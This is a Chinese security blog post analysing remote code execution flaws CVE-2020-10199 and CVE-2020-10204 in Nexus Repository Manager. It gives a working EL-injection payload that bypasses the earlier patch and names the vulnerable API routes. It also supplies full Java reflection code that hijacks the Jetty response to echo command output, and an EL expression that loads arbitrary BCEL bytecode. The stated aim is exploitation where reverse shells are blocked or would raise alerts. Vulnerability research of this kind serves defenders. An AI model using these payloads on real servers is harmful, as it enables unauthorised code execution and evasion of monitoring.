# Nexus Repository Manager(CVE-2020-10199/10204)漏洞分析及回显利用方法的简单讨论 - magic_zero - 博客园

> 原文：[`www.cnblogs.com/magic-zero/p/12641068.html`](https://www.cnblogs.com/magic-zero/p/12641068.html)

**0x00 前言**

3 月 31 日的时候 Nexus Repository Manager 官方发布了[CVE-2020-10199](https://support.sonatype.com/hc/en-us/articles/360044882533 "CVE-2020-10199")，[CVE-2020-10204](https://support.sonatype.com/hc/en-us/articles/360044356194-CVE-2020-10204-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31 "CVE-2020-10204")的漏洞公告，两个漏洞均是由 Github Secutiry Lab 的@pwntester 发现的。本着学习的态度，跟进学习了一下，于是有了此文。从漏洞的描述来看，10199 的漏洞需要普通用户权限即可触发，而 10204 则需要管理员权限。两个漏洞的触发原因均是不安全的执行[EL 表达式](https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html "EL 表达式")导致的。本文将简单分析漏洞的利用方法，重点来讲述一下漏洞利用过程中的回显获取的问题。

**0x01 漏洞分析**

在 Github Security Lab 的主页上列出了@pwntester 利用 codeql 来挖掘[CVE-2020-10199](https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype "CVE-2020-10199")的过程，作者提及在构建污点分析的模型时候参考了[CVE-2018-16621](https://github.com/Cryin/Paper/blob/master/CVE-2018-16621%20Nexus%20Repository%20Manager3%20%E4%BB%BB%E6%84%8FEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5.md "CVE-2018-16621")。看一下该漏洞就不难发现，其实这里的 CVE-2020-10204 就是前者的绕过。因为官方在修复该漏洞的时候采用的方法是将"${"替换为"{", 代码片段如下：

```
/** * Strip java el start token from a string
   * @since 3.14 */
  public String stripJavaEl(final String value) { if (value != null) { return value.replaceAll("\\$+\\{", "{");
    } return null;
  }
}
```

因此参考之前请求的路由，利用如下：

![](img/c20c79a76f544afc1501b6ce678f2578.png)

 漏洞分析的流程可以参考之前 CVE-2018-16621 的分析，这里值得一提的是绕过的方法，因为过滤的正则不严谨，没有考虑到"$"和"{"之间的字符，而 EL 表达式执行的松散性，刚好可以用来绕过该正则。例如这样的 payload 也是可以执行的：

```
{"action":"coreui_User","method":"update","data":[{"userId":"test","version":"1.0","firstName":"xxx","lastName":"xxx","email":"test@qq.com","status":"active","roles":["$+{'this is vulnerability'.toUpperCase()}"]}],"type":"rpc","tid":7}
```

接着再来简单看一下 CVE-2020-10199 漏洞，作者发现如果可控的数据进入到 createViolation 函数将会调用 buildConstraintViolationWithTemplate 执行 EL 表达式，而在 org.sonatype.nexus.repository.rest.api.AbstractGroupRepositoriesApiResource 类中则存在如下的函数调用： 

```
  private void validateGroupMembers(T request) {
    String groupFormat = request.getFormat();
    Set<ConstraintViolation<?>> violations = Sets.newHashSet();
    Collection<String> memberNames = request.getGroup().getMemberNames(); for (String repositoryName : memberNames) {
      Repository repository = repositoryManager.get(repositoryName); if (nonNull(repository)) {
        String memberFormat = repository.getFormat().getValue(); if (!memberFormat.equals(groupFormat)) {
          violations.add(constraintViolationFactory.createViolation("memberNames", "Member repository format does not match group repository format: " + repositoryName));
        }
      } else {
        violations.add(constraintViolationFactory.createViolation("memberNames", "Member repository does not exist: " + repositoryName));
      }
    }
    maybePropagate(violations, log);
  }
```

但是该类是一个抽象类，因此实现该类的子类如果调用 validateGroupMembers 方法将有机会执行 EL 表达式，搜索可以发现该类的实现只有 org.sonatype.nexus.repository.golang.rest.GolangGroupRepositoriesApiResource 这么一个类，在该类执行创建仓库/更新仓库的操作中都将利用到该方法：

```
 @POST
  @RequiresAuthentication
  @Validate public Response createRepository(final T request) {
    validateGroupMembers(request); return super.createRepository(request);
  }

  @PUT
  @Path("/{repositoryName}")
  @RequiresAuthentication
  @Validate public Response updateRepository( final T request,
      @PathParam("repositoryName") final String repositoryName)
  {
    validateGroupMembers(request); return super.updateRepository(request, repositoryName);
  }
```

接下来就是寻找路由触发漏洞，借助于 idea 可以看到路由的访问：

![](img/1cf95f1881b2f33e64bc51d794986612.png)

 刚开始请求，无论如何都不对，后来在[`127.0.0.1:8081/#admin/system/api`](http://192.168.199.218:8081/#admin/system/api)发现了如下的接口文档： 

![](img/f19391c006c2183511921fe3ec26f01c.png)

 但是这里有一个坑，就是用来触发漏洞的 memberNames 的值为一个 ArrayList，因此文档有错误：

![](img/1cd7ddb2893b48f8fe69fcc0142c0f81.png)

 修改以后重新发包，漏洞触发成功：

![](img/c93a0858aa841255800f9b51b10f57a9.png)

**0x02 获取回显** 

  在实际的渗透测试环境下，如果目标主机不出网，将无法反弹 shell 进行利用，而且反弹 shell 这种敏感操作也容易触发安全警报。而由于目标环境的原因，web shell 不一定都可以执行，实现命令执行的回显利用就显得比较重要了。目前来说，通用的回显思路不外乎以下的几种：

1\. 利用报错。实现的方法是在代码执行的时候将所执行命令的结果直接使用异常进行抛出，因为异常没有被捕获处理的原因将会抛出在页面上。

2\. 写入到文件。这个方式不难理解了，将命令执行的回显输出到文件，然后进行访问。

3\. 获取当前线程中绑定的输出流对象，调用输出的方法进行输出。

4\. rmi 之类的通过实现服务端，重新注册之后，正常去调用即可。

这里因为报错的时候会被上层进行捕获，我暂时没找到利用的方法。因此这里采用获取输出流的方式，具体的方法就是在表达式执行(org.hibernate.validator.internal.engine.messageinterpolation.ElTermResolver)的时候打断点，然后在调试器中看当前上下文中 ThreadLocal 绑定的对象：

![](img/efb21c358e41b3cd2346a707592264e2.png)

 然后在调试器中可以找到 request 对象：

![](img/c7d05566dad48418d9abd47c88813ff4.png)

 这里绑定的对象很多，可以拿到 request 对象的地方也挺多的。本地测试的时候选择的是 org.eclipse.jetty.server.HttpConnection 的实例对象。从图中可以看出该对象的成员属性 _channel 中包含了 request 对象。通过查看该对象的实例方法发现通过 getHttpChannel 方法来获得 HttpChannel 对象，然后再通过所得对象的 getRequest 方法即可获取 Request 对象。Request 对象是 org.eclipse.jetty.server.Request 的实例，该类继承自 HttpServletRequest。画一个关系图就是下边这样的：

```
org.eclipse.jetty.server.HttpConnection.getHttpChannel() ==> org.eclipse.jetty.server.HttpChannel.getResponse() ==> write()
```

首先需要来获取 java.lang.ThreadLocal$ThreadLocalMap$Entry 中的对象，利用的代码如下：

```
    public static void getObjectFromThread() { try { //获取当前线程对象
            Thread thread = Thread.currentThread(); //获取 Thread 中的 threadLocals 对象
            Field threadLocals = Thread.class.getDeclaredField("threadLocals");
            threadLocals.setAccessible(true); //ThreadLocalMap 是 ThreadLocal 中的一个内部类，并且访问权限是 default // 这里获取的是 ThreadLocal.ThreadLocalMap
            Object threadLocalMap = threadLocals.get(thread); //这里要这样获取 ThreadLocal.ThreadLocalMap
            Class threadLocalMapClazz = Class.forName("java.lang.ThreadLocal$ThreadLocalMap"); //获取 ThreadLocalMap 中的 Entry 对象
            Field tableField = threadLocalMapClazz.getDeclaredField("table");
            tableField.setAccessible(true); //获取 ThreadLocalMap 中的 Entry
            Object[] Entries = (Object[]) tableField.get(threadLocalMap); //获取 ThreadLocalMap 中的 Entry Class
            Class entryClass = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry"); //获取 ThreadLocalMap 中的 Entry 中的 value 字段， 该字段类型为 HashMap 类型
            Field entryValueField = entryClass.getDeclaredField("value");
            entryValueField.setAccessible(true);

            String results = ""; for (Object entry : Entries) { if (entry != null) { try {
                        Object val = entryValueField.get(entry); if (val != null) {
                            results += val.getClass().getName() + "\n";
                        }
                    } catch (IllegalAccessException e) {

                    }
                }
            }
            System.out.println(results);
        } catch (Exception e) {

        }
    }
```

然后从获取到的 Entry 对象中找到 HttpConnection 对象即可。完整的利用代码如下：

```
public static void getResponseFromThread() { try { //获取当前线程对象
            Thread thread = Thread.currentThread(); //获取 Thread 中的 threadLocals 对象
            Field threadLocals = Thread.class.getDeclaredField("threadLocals");
            threadLocals.setAccessible(true); //ThreadLocalMap 是 ThreadLocal 中的一个内部类，并且访问权限是 default // 这里获取的是 ThreadLocal.ThreadLocalMap
            Object threadLocalMap = threadLocals.get(thread); //这里要这样获取 ThreadLocal.ThreadLocalMap
            Class threadLocalMapClazz = Class.forName("java.lang.ThreadLocal$ThreadLocalMap"); //获取 ThreadLocalMap 中的 Entry 对象
            Field tableField = threadLocalMapClazz.getDeclaredField("table");
            tableField.setAccessible(true); //获取 ThreadLocalMap 中的 Entry
            Object[] objects = (Object[]) tableField.get(threadLocalMap); //获取 ThreadLocalMap 中的 Entry
            Class entryClass = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry"); //获取 ThreadLocalMap 中的 Entry 中的 value 字段
            Field entryValueField = entryClass.getDeclaredField("value");
            entryValueField.setAccessible(true); for (Object object : objects) { if (object != null) { try {
                        Object httpConnection = entryValueField.get(object); if (httpConnection != null) { if (httpConnection.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection")) {
                                Class<?> HttpConnection = httpConnection.getClass();
　　　　　　　　　　　　　　　　　　　// 获取 HttpChannel 对象
                                Object httpChannel = HttpConnection.getMethod("getHttpChannel").invoke(httpConnection);
                                Class<?> HttpChannel = httpChannel.getClass();
　　　　　　　　　　　　　　　　　　　// 获取 request 对象
                                Object request = HttpChannel.getMethod("getRequest").invoke(httpChannel);
　　　　　　　　　　　　　　　　　　　// 获取自定义头部
                                String header = (String) request.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(request, new Object[]{"MagicZero"});
　　　　　　　　　　　　　　　　　　　// 获取 response 对象
                                Object response = HttpChannel.getMethod("getResponse").invoke(httpChannel);
                                PrintWriter writer = (PrintWriter)response.getClass().getMethod("getWriter").invoke(response);
                                writer.write(header);
                                writer.close();
                            }
                        }
                    } catch (IllegalAccessException e) {

                    }
                }
            }
        } catch (Exception e) {

        }
    }
```

以上的代码已经能够获取到 request 和 response 对象，接着我们来解决如何使用 EL 表达式将该类动态加载出来。这里选择 JDK 内置的 com.sun.org.apache.bcel.internal.util.ClassLoader 来动态加载我们的类：

```
${''.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('bcel class byte').newInstance()
```

BCEL 字节码生成的方法：

```
// 该参数接收的是一个 Class 文件
public static String class2BCEL(String classFile) throws Exception{
    Path path = Paths.get(classFile); byte[] bytes = Files.readAllBytes(path);
    String result = Utility.encode(bytes,true); return result;
}
```

最终的利用效果：

![](img/f1a5eaa53d0a2adb1a31ec28bd9e50c6.png)